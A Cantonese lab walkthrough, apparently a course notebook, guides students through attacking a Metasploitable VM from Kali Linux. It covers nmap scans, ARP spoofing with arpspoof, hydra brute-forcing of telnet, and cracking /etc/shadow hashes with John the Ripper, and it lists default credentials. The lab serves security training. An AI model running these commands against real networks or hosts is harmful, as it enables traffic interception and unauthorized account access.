# %% [markdown]
# 1. 下載 + 安裝 VMware Workstation 16 Player (安裝時全部按 下一步/next 就可)<br>
# https://www.vmware.com/products/workstation-player/workstation-pl1ayer-evaluation.html<br><br>
#
# 3. 下載 + 安裝 WinSCP (安裝時全部按 下一步/next 就可)<br>
# http://winscp.net/eng/download.php<br><br>
#
# 4. 下載 + 解壓縮 Kali Linux + Metasploitable<br>
# https://drive.google.com/file/d/1QZY_QIF3BgENmIBR-6hTKMZRDcT6Uwz0/view?usp=sharing<br>
# https://drive.google.com/file/d/1o-ArGgDPMDJpFIndl5DHv669C6N3dDdC/view?usp=sharing<br><br>
#
# 5. 開 Vmware Workstation 16 Player，選 Open a Virtual Machine，去解壓縮了的 Kali Linux 檔，選 Kali-Linux-2020.4-vmware-amd64<br>
# <img src="attachment:one.png" style="width:700px;"/><br>
# <img src="attachment:two.png" style="width:700px;"/><br>
#
# 6. 選多一次 Open a Virtual Machine，去解壓縮了的 Metasploitable 檔，選 Metasploitable<br>
# <img src="attachment:three.png" style="width:700px;"/><br>
# <img src="attachment:four.png" style="width:700px;"/><br>
#
# 7. 在 Kali Linux 選 Play virtual machine<br>
# Login:<br>
# username: kali<br>
# password: kali<br>
# <img src="attachment:five.png" style="width:700px;"/><br>
# <img src="attachment:six.png" style="width:700px;"/><br>
# <img src="attachment:seven.png" style="width:700px;"/><br>
#
# 8. 開 Terminal<br>
# <img src="attachment:eight.png" style="width:700px;"/><br>
#
# 9. 輸入<br>
# <code>ifconfig</code><br>
# <code>route -n</code><br>
# <code>arp -a</code><br>
# 在 abc_lab1_template 填返 Kali Linux 的 IP + MAC + Default gateway<br>
# (Kali Linux IP 係 eth0 果欄，唔係 lo 果欄!)<br>
# ![nine.png](attachment:nine.png)<br>
#
# 10. 輸入 <code>sudo passwd root</code>(改 root password)<br>
# 輸入 password: kali (輸入後不會顯示出來，完成後直接 enter)<br>
# 輸入新 root password: toor<br>
# 輸入多一次 toor<br>
# ![ten.png](attachment:ten.png)<br>
#
# 11. 輸入<code>hostnamectl set-hostname --static (YourName) (e.g. ChanTaiMan)</code>，然後入password kali<br><br>
#
# 12. Logout, 然後 login 做 root<br>
# ![eleven.png](attachment:eleven.png)<br>
# ![twevlth.png](attachment:twevlth.png)<br>
#
# 21. 開多一個 VMware Workstation 16 Player，開 Metasploitable<br>
# Login: msfadmin<br>
# Password: msfadmin<br>
# ![seventeen.png](attachment:seventeen.png)<br>
#
# 22. 輸入<br>
# <code>ifconfig</code><br>
# <code>route -n</code><br>
# 填返 Metasploitable IP + MAC 和 Default gateway IP<br>
# 然後<code>ping (default-gateway-ip)</code>，彈出一兩行後 Ctrl + C 結束<br>
# 然後輸入<code>arp -a</code><br>
# 填返 Default gateway MAC address<br>
# ![eighteen.png](attachment:eighteen.png)<br>
# ![thirty-one.png](attachment:thirty-one.png)<br>
#
# 23. ***(# 2.2)*** 回到 Kali Linux，輸入<code>whois bulbsecurity.com</code>，cap 圖 (Capture Screen 1)<br>
# ![nineteen.png](attachment:nineteen.png)<br>
#
# 24. ***(# 2.2)*** 回到 Metasploitable，輸入<code>nslookup bulbsecurity.com</code>，cap 圖 (Capture Screen 1)<br>
# ![twenty.png](attachment:twenty.png)<br>
#
# 25. ***(# 2.2)*** 回到 Kali Linux，輸入<br>
# <code>host -t ns zoneedit.com</code><br>
# <code>host -t mx zoneedit.com</code><br>
# <code>host -t a zoneedit.com</code><br>
# <code>host -t ptr 64.68.198.1</code><br>
# <code>host -t soa zoneedit.com</code><br>
# cap 圖 (Capture Screen 1)<br>
# ![twenty-one.png](attachment:twenty-one.png)<br>
#
# 26. ***(# 2.3)*** 輸入<br>
# <code>nmap -sS (Metasploitable-IP) -oA bookmap</code>(SYN scan)<br>
# <code>nmap -sV (Metasploitable-IP) -oA bookmap</code>(version scan)<br>
# (-sV 可能要等一陣先出結果)<br>
# <code>nmap -sU (Metasploitable-IP) -oA bookmap</code>(UDP scan)<br>
# (-sU 我等左好耐都冇反應，做不到)<br>
# cap 圖 (Capture Screen 2)<br>
# ![twenty-two.png](attachment:twenty-two.png)<br>
# ![twenty-three.png](attachment:twenty-three.png)<br>
#
# 27. 在 Metasploitable 輸入<code>sudo touch /home/ftp/msf_ftp</code>(建立一個 ftp file 去 test nmap scripting engine)<br><br>
#
# 28. ***(# 3.2)*** 在 Kali Linux 輸入<code>nmap -sC (Metasploitable-IP)</code>，cap 圖 (Capture Screen 3)<br>
# (呢個都可能要等一陣先出結果)<br>
# ![twenty-four.png](attachment:twenty-four.png)<br>
#
# 29. 在 Kali Linux 開 Wireshark<br>
# ![twenty-five.png](attachment:twenty-five.png)<br>
# ![twenty-six.png](attachment:twenty-six.png)<br>
# ![twenty-seven.png](attachment:twenty-seven.png)<br>
#
# 30. 在 Kali Linux 開 Terminal, 輸入 <code>sysctl -w net.ipv4.ip_forward=1</code><br><br>
#
# 31. 輸入<code>apt-get update</code><br>
# 然後<code>apt-get install dsniff</code><br>
# ![twenty-nine.png](attachment:twenty-nine.png)<br>
#
# 32. 在 Windows 主機開 cmd，輸入<code>ipconfig</code><br>
# 找出VMware Network Adapter VMnet8 + Windows 主機的網卡兩欄<br>
# 如果係用 Wifi (無線)，IP 會顯示在 無線介面卡 一欄<br>
# 如果係用有線，IP 會顯示在 乙太網絡 一欄<br>
# ![thirty-two.png](attachment:thirty-two.png)<br>
# ![thirty-three.png](attachment:thirty-three.png)<br>
#
# 33. 輸入<code>arp -a</code>，對返 Default gateway 的 MAC (實體位址)<br>
# ![thirty-four.png](attachment:thirty-four.png)<br>
#
# 34. 在 Kali Linux Terminal 輸入<code>arpspoof -i eth0 -t (Windows 主機 VMnet8-IP) -r (Metasploitable-IP)</code><br>
# ![thirty-six.png](attachment:thirty-six.png)<br>
#
# 35. 開初初剛安裝的 WinSCP<br>
# 檔案協定：FTP<br>
# 主機名稱：Metasploitable 的 IP<br>
# 使用者名稱：anonymous<br>
# 密碼：anonymous<br>
# ![thirty-five.png](attachment:thirty-five.png)<br>
#
# 36. ***(# 4.3)*** 回到 Kali Linux 的 Wireshark，在圖中位置輸入 icmp or ftp<br>，cap 圖 (Capture Screen 4，要看到 FTP + ICMP 兩種在圖中)
# ![thirty-seven.png](attachment:thirty-seven.png)<br>
#
# 37. 完成後在 Terminal 停止 arpspoof (Ctrl + C 停止)<br>
# ![thirty-eight.png](attachment:thirty-eight.png)<br>
#
# 38. 輸入<code>nano userlist.txt</code>，如圖輸入幾個字<br><br>
# <code>msfadmin
#     user
#     postgres
#     service
#     klog
#     sys</code><br><br>
# 然後 Ctrl + O > Enter 儲存，Ctrl + X 離開<br>
# ![thirty-nine.png](attachment:thirty-nine.png)<br>
#
# 39. 輸入<code>nano passwordlist.txt</code>，如圖輸入幾個字<br><br>
# <code>msfadmin
#     user
#     postgres
#     service
#     123456789
#     batman</code><br><br>
# 然後 Ctrl + O > Enter 儲存，Ctrl + X 離開<br>
# ![fourty.png](attachment:fourty.png)<br>
#
# 40. ***(# 5.3)*** 輸入<code>hydra -L userlist.txt -P passwordlist.txt (Metasploitable-IP) telnet</code>，cap 圖 (Capture Screen 5)<br>
# ![fourty-one.png](attachment:fourty-one.png)<br>
#
# 41. 輸入<code>nano msf_shadow</code>，輸入<br>
# <code>msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
# user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
# postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
# service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
# klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
# sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD910:14742:0:99999:7:::</code><br>
# 然後 Ctrl + O > Enter 儲存，Ctrl + X 離開<br>
# (這堆文字由 Metasploitable: /etc/shadow 抄出)<br>
# ![fourty-two.png](attachment:fourty-two.png)<br>
#
# 42. ***(# 5.5)*** 輸入<code>john msf_shadow</code>，cap 圖 (Capture Screen 6)<br>
# ![fourty-three.png](attachment:fourty-three.png)<br>
